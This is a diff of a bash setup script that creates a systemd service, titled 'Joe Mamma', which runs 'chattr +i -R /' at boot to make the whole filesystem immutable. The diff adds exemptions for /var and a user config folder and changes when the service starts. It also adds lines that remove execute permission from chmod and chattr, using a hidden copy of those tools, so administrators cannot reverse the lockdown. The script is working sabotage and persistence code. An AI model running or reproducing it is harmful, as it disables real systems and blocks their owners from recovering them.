@@ -17,12 +17,14 @@ touch immute.sh
 chmod +x immute.sh
 echo "#!/bin/bash" >> immute.sh
 echo "$trovePath/chattr +i -R /" >> immute.sh
+echo "$trovePath/chattr -i -R /home/user/.config" >> immute.sh
+echo "$trovePath/chattr -i -R /var" >> immute.sh
 immutePath="$thisDirPath/immute.sh"
 immuteServicePath="/etc/systemd/system/""$magicPrefix""immute.service"
 touch $immuteServicePath
 echo "[Unit]" >> "$immuteServicePath"
 echo "Description=Joe Mamma" >> "$immuteServicePath"
-echo "After=multi-user.target" >> "$immuteServicePath"
+echo "After=graphical.target" >> "$immuteServicePath"
 echo "" >> "$immuteServicePath"
 echo "[Service]" >> "$immuteServicePath"
 echo "Type=simple" >> "$immuteServicePath"
@@ -58,5 +60,8 @@ echo "[Install]" >> "$shutdownServicePath"
 echo "WantedBy=shutdown.target" >> "$shutdownServicePath" 
 systemctl daemon-reload
 systemctl enable "$shutdownServicePath"
+
+$trovePath/chmod -x /usr/bin/chmod
+$trovePath/chmod -x /usr/bin/chattr
 
 echo "Setup."
